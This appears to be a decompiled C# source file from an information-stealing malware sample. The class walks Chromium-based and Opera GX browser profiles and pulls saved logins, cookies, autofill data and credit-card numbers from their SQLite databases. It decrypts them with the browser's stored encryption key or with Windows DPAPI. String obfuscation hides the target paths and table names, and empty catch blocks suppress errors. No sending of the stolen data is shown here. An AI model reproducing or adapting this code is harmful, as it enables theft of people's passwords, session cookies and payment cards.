using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;

// Token: 0x02000002 RID: 2
public static class Entity18
{
	// Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000450
	public static List<Entity9> Id1(IList<string> profiles)
	{
		List<Entity9> list = new List<Entity9>();
		try
		{
			foreach (string baseDirectory in from x in profiles
			select Environment.ExpandEnvironmentVariables(x))
			{
				List<string> list2 = FileCopier.FindPaths(baseDirectory, 1, 1, new string[]
				{
					"LEnvironmentogiEnvironmentn DatEnvironmenta".Replace("Environment", string.Empty),
					"WSystem.Texteb DatSystem.Texta".Replace("System.Text", string.Empty),
					"CoCryptographyokieCryptographys".Replace("Cryptography", string.Empty),
					"ExtGenericension CooGenerickies".Replace("Generic", string.Empty)
				});
				foreach (string text in list2)
				{
					Entity9 entity = new Entity9();
					string dataFolder = string.Empty;
					string text2 = string.Empty;
					try
					{
						dataFolder = new FileInfo(text).Directory.FullName;
						bool flag = dataFolder.Contains("OFileInfopeFileInfora GFileInfoX StabFileInfole".Replace("FileInfo", string.Empty));
						if (flag)
						{
							text2 = "OpLinqera GLinqX".Replace("Linq", string.Empty);
						}
						else
						{
							text2 = (text.Contains("ApGenericpDaGenericta\\RGenericoamiGenericng\\".Replace("Generic", string.Empty)) ? FileCopier.ChromeGetRoamingName(dataFolder) : FileCopier.ChromeGetLocalName(dataFolder));
						}
						bool flag2 = !string.IsNullOrEmpty(text2);
						if (flag2)
						{
							text2 = text2[0].ToString().ToUpper() + text2.Remove(0, 1);
							string text3 = FileCopier.ChromeGetName(dataFolder);
							bool flag3 = !string.IsNullOrEmpty(text3);
							if (flag3)
							{
								List<Entity10> id = Entity18.Id8<List<Entity10>>(() => Entity18.Id3(dataFolder, new string(new char[]
								{
									'C',
									'o',
									'o',
									'k',
									'i',
									'e',
									's'
								})), (List<Entity10> x) => x.Count > 0);
								List<Entity10> list3 = Entity18.Id8<List<Entity10>>(() => Entity18.Id3(dataFolder, "Network\\" + new string(new char[]
								{
									'C',
									'o',
									'o',
									'k',
									'i',
									'e',
									's'
								})), (List<Entity10> x) => x.Count > 0);
								List<Entity10> list4 = Entity18.Id8<List<Entity10>>(() => Entity18.Id3(dataFolder, new string(new char[]
								{
									'E',
									'x',
									't',
									'e',
									'n',
									's',
									'i',
									'o',
									'n',
									' ',
									'C',
									'o',
									'o',
									'k',
									'i',
									'e',
									's'
								})), (List<Entity10> x) => x.Count > 0);
								entity.Id1 = text2;
								entity.Id2 = text3;
								entity.Id3 = Entity18.Id8<List<Entity12>>(() => Entity18.Id2(dataFolder), (List<Entity12> x) => x.Count > 0);
								entity.Id6 = id;
								entity.Id4 = Entity18.Id8<List<Entity8>>(() => Entity18.Id4(dataFolder), (List<Entity8> x) => x.Count > 0);
								entity.Id5 = Entity18.Id8<List<Entity11>>(() => Entity18.Id5(dataFolder), (List<Entity11> x) => x.Count > 0);
								bool flag4 = list3.Any<Entity10>();
								if (flag4)
								{
									Entity9 item = new Entity9
									{
										Id1 = text2,
										Id2 = text3 + " Network",
										Id3 = new List<Entity12>(),
										Id6 = list3,
										Id4 = new List<Entity8>(),
										Id5 = new List<Entity11>()
									};
									list.Add(item);
								}
								bool flag5 = list4.Any<Entity10>();
								if (flag5)
								{
									Entity9 item2 = new Entity9
									{
										Id1 = text2,
										Id2 = text3 + " Extension",
										Id3 = new List<Entity12>(),
										Id6 = list4,
										Id4 = new List<Entity8>(),
										Id5 = new List<Entity11>()
									};
									list.Add(item2);
								}
							}
						}
					}
					catch (Exception ex)
					{
					}
					bool flag6 = !entity.Id7();
					if (flag6)
					{
						list.Add(entity);
					}
				}
			}
		}
		catch
		{
		}
		return list;
	}

	// Token: 0x06000002 RID: 2 RVA: 0x00002538 File Offset: 0x00000938
	private static List<Entity12> Id2(string profilePath)
	{
		List<Entity12> list = new List<Entity12>();
		try
		{
			string text = Path.Combine(profilePath, new string(new char[]
			{
				'L',
				'o',
				'g',
				'i',
				'n',
				' ',
				'D',
				'a',
				't',
				'a'
			}));
			bool flag = !File.Exists(text);
			if (flag)
			{
				return list;
			}
			string chromeKey = Entity18.Id7(profilePath);
			try
			{
				EntityReaderSql entityReaderSql = new EntityReaderSql(text);
				entityReaderSql.ReadContextTable(new string(new char[]
				{
					'l',
					'o',
					'g',
					'i',
					'n',
					's'
				}));
				for (int i = 0; i < entityReaderSql.RowLength; i++)
				{
					Entity12 entity = new Entity12();
					try
					{
						entity.Id1 = entityReaderSql.ReadContextValue(i, 0).Trim();
						entity.Id2 = entityReaderSql.ReadContextValue(i, 3).Trim();
						entity.Id3 = Entity18.Id6(entityReaderSql.ReadContextValue(i, 5), chromeKey);
					}
					catch (Exception ex)
					{
					}
					finally
					{
						entity.Id1 = (string.IsNullOrWhiteSpace(entity.Id1) ? "UNKNOWN" : entity.Id1);
						entity.Id2 = (string.IsNullOrWhiteSpace(entity.Id2) ? "UNKNOWN" : entity.Id2);
						entity.Id3 = (string.IsNullOrWhiteSpace(entity.Id3) ? "UNKNOWN" : entity.Id3);
					}
					bool flag2 = entity.Id3 != "UNKNOWN";
					if (flag2)
					{
						list.Add(entity);
					}
				}
			}
			catch (Exception ex2)
			{
			}
		}
		catch (Exception ex3)
		{
		}
		return list;
	}

	// Token: 0x06000003 RID: 3 RVA: 0x0000273C File Offset: 0x00000B3C
	private static List<Entity10> Id3(string profilePath, string dbPath)
	{
		List<Entity10> list = new List<Entity10>();
		try
		{
			string text = Path.Combine(profilePath, dbPath);
			bool flag = !File.Exists(text);
			if (flag)
			{
				return list;
			}
			string chromeKey = Entity18.Id7(profilePath);
			try
			{
				EntityReaderSql entityReaderSql = new EntityReaderSql(text);
				entityReaderSql.ReadContextTable(new string(new char[]
				{
					'c',
					'o',
					'o',
					'k',
					'i',
					'e',
					's'
				}));
				for (int i = 0; i < entityReaderSql.RowLength; i++)
				{
					Entity10 entity = null;
					try
					{
						entity = new Entity10
						{
							Id1 = entityReaderSql.ReadContextValue(i, 1).Trim(),
							Id2 = (entityReaderSql.ReadContextValue(i, 1).Trim()[0] == '.'),
							Id3 = entityReaderSql.ReadContextValue(i, 6).Trim(),
							Id4 = (entityReaderSql.ReadContextValue(i, 8)[0] == '1'),
							Id5 = Convert.ToInt64(entityReaderSql.ReadContextValue(i, 7).Trim()) / 1000000L - 11644473600L,
							Id6 = entityReaderSql.ReadContextValue(i, 3).Trim(),
							Id7 = Entity18.Id6(entityReaderSql.ReadContextValue(i, 5), chromeKey)
						};
						bool flag2 = entity.Id5 < 0L;
						if (flag2)
						{
							entity.Id5 = DateTime.Now.AddMonths(12).Ticks - 621355968000000000L;
						}
					}
					catch
					{
					}
					bool flag3 = !string.IsNullOrWhiteSpace((entity != null) ? entity.Id7 : null);
					if (flag3)
					{
						list.Add(entity);
					}
				}
			}
			catch
			{
			}
		}
		catch (Exception ex)
		{
		}
		return list;
	}

	// Token: 0x06000004 RID: 4 RVA: 0x0000295C File Offset: 0x00000D5C
	private static List<Entity8> Id4(string profilePath)
	{
		List<Entity8> list = new List<Entity8>();
		try
		{
			string text = Path.Combine(profilePath, new string(new char[]
			{
				'W',
				'e',
				'b',
				' ',
				'D',
				'a',
				't',
				'a'
			}));
			bool flag = !File.Exists(text);
			if (flag)
			{
				return list;
			}
			string chromeKey = Entity18.Id7(profilePath);
			try
			{
				EntityReaderSql entityReaderSql = new EntityReaderSql(text);
				entityReaderSql.ReadContextTable(new string(new char[]
				{
					'a',
					'u',
					't',
					'o',
					'f',
					'i',
					'l',
					'l'
				}));
				for (int i = 0; i < entityReaderSql.RowLength; i++)
				{
					Entity8 entity = null;
					try
					{
						string text2 = entityReaderSql.GatherValue(i, new string(new char[]
						{
							'v',
							'a',
							'l',
							'u',
							'e'
						})).Trim();
						bool flag2 = text2.StartsWith(new string(new char[]
						{
							'v',
							'1',
							'0'
						})) || text2.StartsWith(new string(new char[]
						{
							'v',
							'1',
							'1'
						}));
						if (flag2)
						{
							text2 = Entity18.Id6(text2, chromeKey);
						}
						entity = new Entity8
						{
							Id1 = entityReaderSql.GatherValue(i, new string(new char[]
							{
								'n',
								'a',
								'm',
								'e'
							})).Trim(),
							Id2 = text2
						};
					}
					catch
					{
					}
					bool flag3 = entity != null;
					if (flag3)
					{
						list.Add(entity);
					}
				}
			}
			catch (Exception ex)
			{
			}
		}
		catch (Exception ex2)
		{
		}
		return list;
	}

	// Token: 0x06000005 RID: 5 RVA: 0x00002B34 File Offset: 0x00000F34
	private static List<Entity11> Id5(string profilePath)
	{
		List<Entity11> list = new List<Entity11>();
		try
		{
			string text = Path.Combine(profilePath, new string(new char[]
			{
				'W',
				'e',
				'b',
				' ',
				'D',
				'a',
				't',
				'a'
			}));
			bool flag = !File.Exists(text);
			if (flag)
			{
				return list;
			}
			string chromeKey = Entity18.Id7(profilePath);
			try
			{
				EntityReaderSql entityReaderSql = new EntityReaderSql(text);
				entityReaderSql.ReadContextTable("cFileStreamredFileStreamit_cFileStreamardFileStreams".Replace("FileStream", string.Empty));
				for (int i = 0; i < entityReaderSql.RowLength; i++)
				{
					Entity11 entity = null;
					try
					{
						entity = new Entity11
						{
							Id1 = entityReaderSql.ReadContextValue(i, 1).Trim(),
							Id2 = Convert.ToInt32(entityReaderSql.ReadContextValue(i, 2).Trim()),
							Id3 = Convert.ToInt32(entityReaderSql.ReadContextValue(i, 3).Trim()),
							Id4 = Entity18.Id6(entityReaderSql.ReadContextValue(i, 4), chromeKey).Replace(" ", string.Empty)
						};
					}
					catch
					{
					}
					bool flag2 = entity != null;
					if (flag2)
					{
						list.Add(entity);
					}
				}
			}
			catch (Exception ex)
			{
			}
		}
		catch (Exception ex2)
		{
		}
		return list;
	}

	// Token: 0x06000006 RID: 6 RVA: 0x00002CCC File Offset: 0x000010CC
	public static string Id6(string chiperText, string chromeKey)
	{
		string result = string.Empty;
		try
		{
			bool flag = chiperText[0] == 'v' && chiperText[1] == '1';
			if (flag)
			{
				result = IntРtr.Decrypt(Convert.FromBase64CharArray(chromeKey.ToCharArray(), 0, chromeKey.Length), chiperText);
			}
			else
			{
				result = CryptoHelper.GetDecoded(chiperText, DataProtectionScope.CurrentUser, null).Trim();
			}
		}
		catch (Exception ex)
		{
		}
		return result;
	}

	// Token: 0x06000007 RID: 7 RVA: 0x00002D48 File Offset: 0x00001148
	public static string Id7(string profilePath)
	{
		string result = string.Empty;
		string text = string.Empty;
		try
		{
			string[] array = profilePath.Split(new string[]
			{
				"\\"
			}, StringSplitOptions.RemoveEmptyEntries);
			array = array.Take(array.Length - 1).ToArray<string>();
			int num = 0;
			for (;;)
			{
				bool flag = num == 0;
				if (flag)
				{
					text = Path.Combine(string.Join("\\", array), new string(new char[]
					{
						'L',
						'o',
						'c',
						'a',
						'l',
						' ',
						'S',
						't',
						'a',
						't',
						'e'
					}));
					bool flag2 = File.Exists(text);
					if (flag2)
					{
						break;
					}
					num++;
				}
				else
				{
					bool flag3 = num == 1;
					if (flag3)
					{
						text = Path.Combine(profilePath, new string(new char[]
						{
							'L',
							'o',
							'c',
							'a',
							'l',
							' ',
							'S',
							't',
							'a',
							't',
							'e'
						}));
						bool flag4 = File.Exists(text);
						if (flag4)
						{
							break;
						}
						num++;
					}
					else
					{
						bool flag5 = num == 2;
						if (flag5)
						{
							text = Path.Combine(string.Join("\\", array), new string(new char[]
							{
								'L',
								'o',
								'c',
								'a',
								'l',
								'P',
								'r',
								'e',
								'f',
								's',
								'.',
								'j',
								's',
								'o',
								'n'
							}));
							bool flag6 = File.Exists(text);
							if (flag6)
							{
								break;
							}
							num++;
						}
						else
						{
							bool flag7 = num == 3;
							if (flag7)
							{
								goto Block_9;
							}
						}
					}
				}
			}
			goto IL_14B;
			Block_9:
			text = Path.Combine(profilePath, new string(new char[]
			{
				'L',
				'o',
				'c',
				'a',
				'l',
				'P',
				'r',
				'e',
				'f',
				's',
				'.',
				'j',
				's',
				'o',
				'n'
			}));
			IL_14B:
			bool flag8 = File.Exists(text);
			if (flag8)
			{
				try
				{
					result = text.ReadFileAsText().FromJSON<LocalState>().os_crypt.encrypted_key;
				}
				catch (Exception ex)
				{
				}
			}
		}
		catch
		{
		}
		return result;
	}

	// Token: 0x06000008 RID: 8 RVA: 0x00002F14 File Offset: 0x00001314
	public static T Id8<T>(Func<T> func, Func<T, bool> success)
	{
		int num = 1;
		T t = func();
		while (!success(t))
		{
			t = func();
			num++;
			bool flag = num > 2;
			if (flag)
			{
				return t;
			}
		}
		return t;
	}
}
